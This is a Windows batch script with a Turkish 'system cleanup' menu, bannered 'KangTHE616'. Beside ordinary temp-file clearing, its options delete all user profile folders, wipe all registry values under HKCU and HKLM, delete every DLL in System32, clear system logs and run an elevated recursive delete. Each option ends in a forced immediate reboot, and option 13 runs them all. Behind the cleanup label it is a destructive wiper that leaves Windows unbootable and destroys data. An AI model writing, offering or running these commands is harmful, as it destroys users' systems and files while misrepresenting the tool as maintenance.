@echo off
setlocal

:: Figlet ile başlık oluşturuluyor
figlet KangTHE616
echo ------------------------------
echo Sistem Temizliği Menüsü
echo ------------------------------

:MENU
cls
echo ------------------------------
echo 1. Geçici dosyaları temizle
echo 2. Log dosyalarını temizle
echo 3. Kullanıcı profili temizliği
echo 4. Kısayolları temizle
echo 5. Belirli dosyaları sil
echo 6. Şifreli dosyaları sil
echo 7. Kayıt defteri anahtarlarını sil
echo 8. Tüm kayıt defteri anahtarlarını sil
echo 9. Kullanıcı hesaplarını sil
echo 10. Windows güncelleme dosyalarını sil
echo 11. Sistem dosyalarını sil
echo 12. Yönetici yetkileri ile dosya sil
echo 13. Hepsini yap
echo 14. Çıkış
echo ------------------------------
set /p choice="Bir seçenek girin (1-14): "

if "%choice%"=="1" goto CleanTempFiles
if "%choice%"=="2" goto CleanLogFiles
if "%choice%"=="3" goto CleanUserProfile
if "%choice%"=="4" goto CleanShortcuts
if "%choice%"=="5" goto DeleteSpecificFiles
if "%choice%"=="6" goto DeleteEncryptedFiles
if "%choice%"=="7" goto DeleteRegistryKeys
if "%choice%"=="8" goto DeleteAllRegistryKeys
if "%choice%"=="9" goto DeleteUserAccounts
if "%choice%"=="10" goto DeleteUpdateFiles
if "%choice%"=="11" goto DeleteSystemFiles
if "%choice%"=="12" goto AdminCommand
if "%choice%"=="13" goto AllTasks
if "%choice%"=="14" goto Exit

goto MENU

:CleanTempFiles
echo Geçici dosyalar temizleniyor...
del /f /s /q %temp%\*
del /f /s /q C:\Windows\Temp\*
goto Restart

:CleanLogFiles
echo Log dosyaları temizleniyor...
del /f /s /q C:\Windows\System32\LogFiles\*
del /f /s /q C:\Windows\Logs\*
goto Restart

:CleanUserProfile
echo Kullanıcı profili geçici dosyaları temizleniyor...
for /d %%p in (C:\Users\*) do (
    del /f /s /q "%%p\AppData\Local\Temp\*"
)
goto Restart

:CleanShortcuts
echo Kısayollar temizleniyor...
del /f /s /q C:\Users\%username%\Desktop\*.lnk
goto Restart

:DeleteSpecificFiles
echo Belirli dosyalar siliniyor...
del /f /s /q C:\path\to\target\folder\*.txt
del /f /s /q C:\path\to\target\folder\*
goto Restart

:DeleteEncryptedFiles
echo Şifreli dosyalar temizleniyor...
cipher /d C:\path\to\target\folder\* >nul 2>&1
del /f /s /q C:\path\to\target\folder\*
goto Restart

:DeleteRegistryKeys
echo Kayıt defteri anahtarları siliniyor...
reg delete "HKCU\Software\TargetSoftware" /f
reg delete "HKLM\Software\TargetSoftware" /f
goto Restart

:DeleteAllRegistryKeys
echo Tüm kayıt defteri anahtarları temizleniyor...
reg delete "HKCU" /f /va
reg delete "HKLM" /f /va
goto Restart

:DeleteUserAccounts
echo Kullanıcı hesapları temizleniyor...
for /d %%p in (C:\Users\*) do (
    rd /s /q "%%p"
)
goto Restart

:DeleteUpdateFiles
echo Windows güncelleme dosyaları temizleniyor...
del /f /s /q C:\Windows\SoftwareDistribution\Download\*
del /f /s /q C:\Windows\SoftwareDistribution\DataStore\*
goto Restart

:DeleteSystemFiles
echo Sistem dosyaları siliniyor...
del /f /s /q C:\Windows\System32\*.dll
goto Restart

:AdminCommand
echo Yönetici yetkileri ile işlem yapılıyor...
powershell -Command "Start-Process cmd.exe -ArgumentList '/c del /f /s /q C:\CriticalFolder\*' -Verb RunAs"
goto Restart

:AllTasks
call :CleanTempFiles
call :CleanLogFiles
call :CleanUserProfile
call :CleanShortcuts
call :DeleteSpecificFiles
call :DeleteEncryptedFiles
call :DeleteRegistryKeys
call :DeleteAllRegistryKeys
call :DeleteUserAccounts
call :DeleteUpdateFiles
call :DeleteSystemFiles
call :AdminCommand
goto Restart

:Restart
echo İşlem tamamlandı. Sistem yeniden başlatılıyor...
shutdown /r /f /t 0
goto Exit

:Exit
endlocal
exit
